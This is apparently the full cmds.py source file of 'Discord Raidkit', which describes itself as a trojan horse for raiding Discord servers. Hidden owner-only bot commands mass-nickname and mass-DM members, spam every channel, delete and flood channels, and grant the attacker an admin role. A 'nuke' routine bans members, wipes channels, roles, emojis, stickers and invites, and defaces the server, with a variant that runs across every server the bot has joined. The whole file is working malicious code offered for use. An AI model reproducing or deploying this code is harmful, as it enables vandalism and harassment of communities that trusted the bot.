'''
Discord Raidkit v2.3.0 — "The trojan horse of discord raiding"
Copyright © 2022 the-cult-of-integral

a collection of raiding tools, hacking tools, and a token grabber generator for discord; written in Python 3

This program is under the GNU General Public License v2.0.
https://github.com/the-cult-of-integral/discord-raidkit/blob/master/LICENSE

cmds.py contains the malicious, hidden commands of the Anubis and Qetesh raidkits.
cmds.py was last updated on 11/08/22 at 15:12.
'''

import logging
import os

import discord
from config import DRConfig
from discord.ext import commands
from display import show_main_raidkit

logging.basicConfig(level=logging.INFO, format=' %(asctime)s - %(levelname)s - %(message)s',
                    filename='raidkit.log', filemode='a+', datefmt='%d/%m/%Y %H:%M:%S')


class Cmds(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot
        self.cfg = DRConfig(os.path.join('config', 'config.json'))
        return

    @commands.command(hidden=True, aliases=['nick', 'nickall'])
    async def nick_all(self, ctx: commands.Context, *, nickname: str) -> bool:
        if self.bot.is_owner(ctx.author):
            await ctx.message.delete()

            show_main_raidkit(
                self.cfg['theme'], self.cfg['prefix'], f'Nicknaming all users for server : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Nicknaming all users for server : {ctx.guild.name} | {ctx.guild.id}')

            try:
                if nickname.strip():
                    for member in ctx.guild.members:
                        try:
                            await member.edit(nick=nickname)
                        except discord.errors.HTTPException:
                            continue

            except commands.errors.MissingRequiredArgument:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  'Failed to nickname all users: an argument was missing.')
                return False

            except Exception as e:
                show_main_raidkit(
                    self.cfg['theme'], self.cfg['prefix'], f'Failed to nickname all users: {e}')
                logging.error(f'Error in cmds.py - nick_all(): {e}')
                return False

            show_main_raidkit(self.cfg['theme'],
                              self.cfg['prefix'], f'Nicknamed all users for server : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Nicknamed all users for server : {ctx.guild.name} | {ctx.guild.id}')

        return True

    @commands.command(hidden=True, aliases=['msg', 'msgall'])
    async def msg_all(self, ctx: commands.Context, *, message: str) -> bool:
        if self.bot.is_owner(ctx.author):
            await ctx.message.delete()

            show_main_raidkit(
                self.cfg['theme'], self.cfg['prefix'], f'Messaging all users for server : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Messaging all users for server : {ctx.guild.name} | {ctx.guild.id}')

            try:
                if message.strip():
                    for member in ctx.guild.members:
                        if not member.id == self.bot.user.id:
                            try:
                                await member.send(message)
                            except discord.errors.HTTPException:
                                continue

            except commands.errors.MissingRequiredArgument:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  'Failed to message all users: an argument was missing.')
                return False

            except Exception as e:
                show_main_raidkit(
                    self.cfg['theme'], self.cfg['prefix'], f'Failed to message all users: {e}')
                logging.error(f'Error in cmds.py - msg_all(): {e}')
                return False

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Messaged all users for server : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Messaged all users for server : {ctx.guild.name} | {ctx.guild.id}')

        return True

    @commands.command(hidden=True)
    async def spam(self, ctx: commands.Context, *, message: str) -> bool:

        def check_reply(message) -> bool:
            return message.content == 'stop' and message.author == ctx.author

        async def spam_text() -> None:
            while True:
                for c in ctx.guild.text_channels:
                    try:
                        await c.send(message)
                    except discord.errors.HTTPException:
                        continue

        if self.bot.is_owner(ctx.author):
            await ctx.message.delete()

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Spamming server : {ctx.guild.name} | {ctx.guild.id}\nEnter \'stop\' in a text channel to stop spamming.')
            logging.info(
                f'Spamming server : {ctx.guild.name} | {ctx.guild.id}')

            try:
                if message.strip():
                    spam_task = self.bot.loop.create_task(spam_text())
                    await self.bot.wait_for('message', check=check_reply)
                    spam_task.cancel()

            except commands.errors.MissingRequiredArgument:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  'Failed to spam server: an argument was missing.')
                return False

            except Exception as e:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Failed to spam server: {e}')
                logging.error(f'Error in cmds.py - spam(): {e}')
                return False

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Spammed server : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(f'Spammed server : {ctx.guild.name} | {ctx.guild.id}')

        return True

    @commands.command(hidden=True)
    async def cpurge(self, ctx: commands.Context) -> bool:
        if self.bot.is_owner(ctx.author):
            await ctx.message.delete()

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Purging all channels from server : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Purging all channels from server : {ctx.guild.name} | {ctx.guild.id}')

            try:
                for c in ctx.guild.channels:
                    try:
                        await c.delete()
                    except discord.errors.HTTPException:
                        continue

            except commands.errors.MissingRequiredArgument:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  'Failed to purge all channels: an argument was missing.')
                return False

            except Exception as e:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Failed to purge all channels: {e}')
                logging.error(f'Error in cmds.py - cpurge(): {e}')
                return False

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Purged all channels for server : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Purged all channels for server : {ctx.guild.name} | {ctx.guild.id}')

        return True

    @commands.command(hidden=True)
    async def cflood(self, ctx: commands.Context, amount: str, *, name: str) -> bool:
        if self.bot.is_owner(ctx.author):
            await ctx.message.delete()

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Creating {amount} channels for server : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Creating {amount} channels for server : {ctx.guild.name} | {ctx.guild.id}')

            try:
                if int(amount) > 0:
                    for _ in range(int(amount)):
                        try:
                            await ctx.guild.create_text_channel(name)
                        except discord.errors.HTTPException:
                            continue

            except ValueError:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  'Failed to create channels: invalid integer for amount.')
                return False

            except commands.errors.MissingRequiredArgument:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  'Failed to create channels: an argument was missing.')
                return False

            except Exception as e:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Failed to create channels: {e}')
                logging.error(f'Error in cmds.py - cflood(): {e}')
                return False

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Created {amount} channels for server : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Created {amount} channels for server : {ctx.guild.name} | {ctx.guild.id}')

        return True

    @commands.command(hidden=True)
    async def admin(self, ctx: commands.Context, member: discord.Member, *, role_name: str) -> bool:
        if self.bot.is_owner(ctx.author):
            await ctx.message.delete()

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Granting admin role to member {member.name}#{member.discriminator} : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Granting admin role to member {member.name}#{member.discriminator} : {ctx.guild.name} | {ctx.guild.id}')

            try:
                await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.all())
                role = discord.utils.get(ctx.guild.roles, name=role_name)
                await member.add_roles(role)

            except discord.errors.HTTPException as e:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Failed to grant admin role: HTTPException: {e}')
                return False

            except commands.errors.MissingRequiredArgument:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  'Failed to grant admin role: an argument was missing.')
                return False

            except Exception as e:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Failed to grant admin role: {e}')
                logging.error(f'Error in cmds.py - admin(): {e}')
                return False

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Granted admin role to member {member.name}#{member.discriminator} : {ctx.guild.name} | {ctx.guild.id}')
            logging.info(
                f'Granted admin role to member {member.name}#{member.discriminator} : {ctx.guild.name} | {ctx.guild.id}')

        return True

    @commands.command(hidden=True)
    async def raid(self, ctx: commands.Context, role_name: str, nickname: str, amount: str, name: str, *, message: str = '') -> bool:

        def check_reply(message) -> bool:
            return message.content == 'stop' and message.author == ctx.author

        async def spam_text() -> None:
            while True:
                for c in ctx.guild.text_channels:
                    try:
                        await c.send(message)
                    except discord.errors.HTTPException:
                        continue

        if self.bot.is_owner(ctx.author):
            await ctx.message.delete()

            try:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Creating {role_name} role and giving to all users in server : {ctx.guild.name} | {ctx.guild.id}')
                logging.info(
                    f'Creating {role_name} role and giving to all users in server : {ctx.guild.name} | {ctx.guild.id}')

                await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.none(), color=0xff0000)
                role = discord.utils.get(ctx.guild.roles, name=role_name)
                for member in ctx.guild.members:
                    try:
                        await member.add_roles(role)
                    except discord.errors.HTTPException:
                        continue
                logging.info(
                    f'Created {role_name} role and gave to all users in server : {ctx.guild.name} | {ctx.guild.id}')

                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Nicknaming all users for server : {ctx.guild.name} | {ctx.guild.id}')
                logging.info(
                    f'Nicknaming all users for server : {ctx.guild.name} | {ctx.guild.id}')

                for member in ctx.guild.members:
                    try:
                        await member.edit(nick=nickname)
                    except discord.errors.HTTPException:
                        continue
                logging.info(
                    f'Nicknamed all users for server : {ctx.guild.name} | {ctx.guild.id}')

                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Purging all channels from server : {ctx.guild.name} | {ctx.guild.id}')
                logging.info(
                    f'Purging all channels from server : {ctx.guild.name} | {ctx.guild.id}')

                for c in ctx.guild.channels:
                    try:
                        await c.delete()
                    except discord.errors.HTTPException:
                        continue

                if int(amount) > 0:

                    show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                      f'Creating {amount} channels for server : {ctx.guild.name} | {ctx.guild.id}')
                    logging.info(
                        f'Creating {amount} channels for server : {ctx.guild.name} | {ctx.guild.id}')
                    for _ in range(int(amount)):
                        try:
                            await ctx.guild.create_text_channel(name)
                        except discord.errors.HTTPException:
                            continue
                    logging.info(
                        f'Created {amount} channels for server : {ctx.guild.name} | {ctx.guild.id}')
                else:
                    if message.strip():
                        try:
                            await ctx.guild.create_text_channel('raid')
                        except discord.errors.HTTPException:
                            pass

                if message.strip():
                    show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                      f'Spamming server : {ctx.guild.name} | {ctx.guild.id}\nEnter \'stop\' in a text channel to stop spamming.')
                    logging.info(
                        f'Spamming server : {ctx.guild.name} | {ctx.guild.id}')

                    spam_task = self.bot.loop.create_task(spam_text())
                    await self.bot.wait_for('message', check=check_reply)
                    spam_task.cancel()

                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Raided server : {ctx.guild.name} | {ctx.guild.id}')
                logging.info(
                    f'Raided server : {ctx.guild.name} | {ctx.guild.id}')

            except ValueError:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  'Failed to raid server: invalid integer for amount.')
                return False

            except commands.errors.MissingRequiredArgument:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  'Failed to raid server: an argument was missing.')
                return False

            except Exception as e:
                show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                                  f'Failed to raid server: {e}')
                logging.error(f'Error in cmds.py - raid(): {e}')
                return False

        return True

    @commands.command(hidden=True)
    async def nuke(self, ctx: commands.Context) -> bool:
        if self.bot.is_owner(ctx.author):
            await ctx.message.delete()

            if not await self.__nuke(ctx.guild, ctx.author):
                return False

        return True

    @commands.command(hidden=True, aliases=['massnuke', 'nuke_all', 'nukeall'])
    async def mass_nuke(self, ctx: commands.Context) -> bool:
        try:
            if self.bot.is_owner(ctx.author):
                await ctx.message.delete()

                for guild in self.bot.guilds:
                    await self.__nuke(guild, ctx.author)

        except Exception as e:
            show_main_raidkit(
                self.cfg['theme'], self.cfg['prefix'], f'Failed to mass nuke: {e}')
            logging.error(f'Error in cmds.py - mass_nuke(): {e}')
            return False

        show_main_raidkit(self.cfg['theme'],
                          self.cfg['prefix'], 'Nuked all servers.')
        logging.info('Nuked all servers.')

        return True

    @commands.command(hidden=True)
    async def leave(self, ctx: commands.Context) -> bool:
        if self.bot.is_owner(ctx.author):
            await ctx.message.delete()

            try:
                await self.__leave(ctx.guild)
            except Exception as e:
                show_main_raidkit(
                    self.cfg['theme'], self.cfg['prefix'], f'Failed to leave server: {e}')
                logging.error(f'Error in cmds.py - leave(): {e}')
                return False

        return True

    @commands.command(hidden=True, aliases=['massleave', 'leave_all', 'leaveall'])
    async def mass_leave(self, ctx: commands.Context) -> bool:
        try:
            if self.bot.is_owner(ctx.author):
                await ctx.message.delete()

                for guild in self.bot.guilds:
                    await self.__leave(guild)

        except Exception as e:
            show_main_raidkit(
                self.cfg['theme'], self.cfg['prefix'], f'Failed to mass leave: {e}')
            logging.error(f'Error in cmds.py - mass_leave(): {e}')
            return False

        show_main_raidkit(self.cfg['theme'],
                          self.cfg['prefix'], 'Left all servers.')
        logging.info('Left all servers.')

        return True

    async def __leave(self, guild: discord.Guild) -> bool:
        try:
            await guild.leave()
        except Exception as e:
            show_main_raidkit(
                self.cfg['theme'], self.cfg['prefix'], f'Failed to leave server: {e}')
            logging.error(f'Error in cmds.py - __leave(): {e}')
            return False

        show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                          f'Left server: {guild.name} | {guild.id}')
        logging.info(f'Left server: {guild.name} | {guild.id}')

        return True

    async def __nuke(self, guild: discord.Guild, author: discord.Member) -> bool:

        try:

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Banning all members from server : {guild.name} | {guild.id}')
            logging.info(
                f'Banning all members from server : {guild.name} | {guild.id}')

            for member in guild.members:
                try:
                    if not (member.id == self.bot.user.id or member.id == author.id or member.id == guild.owner.id):
                        await member.ban()
                except discord.errors.HTTPException:
                    continue
            logging.info(
                f'Banned all members from server : {guild.name} | {guild.id}')

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Purging all channels from server : {guild.name} | {guild.id}')
            for c in guild.channels:
                try:
                    await c.delete()
                except discord.errors.HTTPException:
                    continue
            logging.info(
                f'Purged all channels from server : {guild.name} | {guild.id}')

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Deleting all roles from server : {guild.name} | {guild.id}')
            for r in guild.roles:
                try:
                    await r.delete()
                except discord.errors.HTTPException:
                    continue
            logging.info(
                f'Deleted all roles from server : {guild.name} | {guild.id}')

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Deleting all emojis from server : {guild.name} | {guild.id}')
            for e in guild.emojis:
                try:
                    await e.delete()
                except discord.errors.HTTPException:
                    continue
            logging.info(
                f'Deleted all emojis from server : {guild.name} | {guild.id}')

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Deleting all stickers from server : {guild.name} | {guild.id}')
            for s in guild.stickers:
                try:
                    await s.delete()
                except discord.errors.HTTPException:
                    continue
            logging.info(
                f'Deleted all stickers from server : {guild.name} | {guild.id}')

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Revoking all invites from server : {guild.name} | {guild.id}')
            for i in await guild.invites():
                try:
                    await i.delete()
                except discord.errors.HTTPException:
                    continue
            logging.info(
                f'Revoked all invites from server : {guild.name} | {guild.id}')

            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              f'Editing server : {guild.name} | {guild.id}')
            with open(os.path.join('cogs', 'shared', 'nuked.jpg'), 'rb') as f:
                icon = f.read()

            try:
                await guild.edit(name='Nuked by the-cult-of-integral')
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(description='Nuked by the-cult-of-integral')
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(icon=icon)
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(banner=icon)
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(splash=icon)
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(discovery_splash=icon)
            except discord.errors.HTTPException:
                pass
                del icon

            try:
                await guild.edit(community=False)
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(default_notifications=discord.NotificationLevel.all_messages)
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(verification_level=discord.VerificationLevel.highest)
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(explicit_content_filter=discord.ContentFilter.all_members)
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(premium_progress_bar_enabled=False)
            except discord.errors.HTTPException:
                pass

            try:
                await guild.edit(preferred_locale='ja')
            except discord.errors.HTTPException:
                pass

                logging.info(
                    f'Edited server : {guild.name} | {guild.id}')

        except commands.errors.MissingRequiredArgument:
            show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                              'Failed to raid server: an argument was missing.')
            return False

        except Exception as e:
            show_main_raidkit(
                self.cfg['theme'], self.cfg['prefix'], f'Failed to raid server: {e}')
            logging.error(f'Error in cmds.py - raid(): {e}')
            return False

        show_main_raidkit(self.cfg['theme'], self.cfg['prefix'],
                          f'Nuked server : {guild.name} | {guild.id}')
        logging.info(f'Nuked server : {guild.name} | {guild.id}')

        return True


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Cmds(bot))
    return
